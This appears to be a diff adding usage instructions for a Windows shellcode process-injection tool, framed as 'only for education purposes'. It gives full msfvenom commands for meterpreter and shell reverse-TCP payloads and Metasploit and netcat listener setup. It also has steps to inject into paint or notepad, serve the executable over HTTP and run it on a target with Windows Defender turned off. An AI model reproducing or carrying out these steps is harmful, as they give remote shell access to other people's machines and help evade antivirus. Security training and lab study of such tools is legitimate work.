@@ -1,0 +1,24 @@
+# This tool is only for education purposes!
+
+# Get the shellcode from msfvenom by typing this command: msfvenom --platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=[IP ADDRESS HERE] LPORT=443 EXITFUNC=thread -f c --var-name=crowPuke
+# Input your Kali IP Address in the msfvenom command, where it says 'IP ADDRESS HERE', then Copy and past the shellcode into the process injector. 
+# Set up a metasploit listener using these commands:
+# set LHOST eth0
+# set LPORT 443
+# set payload windows/x64/meterpreter/reverse_tcp
+# run
+
+# To use this tool, download Virtual Studio, and build it. Once that is done, use the developer powershell, and use follow these processes:
+# I reccommend using the process 'paint'. Find the Process ID by starting the process in powershell by typing: paint
+# Then, find the process ID using this command: tasklist | findstr paint
+# .\process_injector.exe [process ID]
+
+
+# For the targeted_process_injection.exe follow these instructions:
+# the file already targets 'notepad.exe', so make sure notepad is open on your target Windows machine
+# First, generate the shellcode using this command in Kali Linux: msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.18.235 LPORT=8088 -f c
+# Copy and paste the malicious msf venom payload where it says ‘Unsigned Char Payload’. Then, move it into the path, /var/www/html in your Kali Linux machine
+# Use this command: service apache2 start OR go into the /var/www/html directory and start a python server: python3 -m http.server 8000 (Then Access the hosted website containing your executable file with this command: http://<your-ip>:8000/your-executable-file.exe)
+# Serve this file to your Windows machine (Or if you use Windows Virtual Studio then you don't have to do the previous step).
+# Execute the file on the target Windows machine (preferrably with Windows Defender turned OFF), and set up a listener module using this command: nc -lvp 8088
+
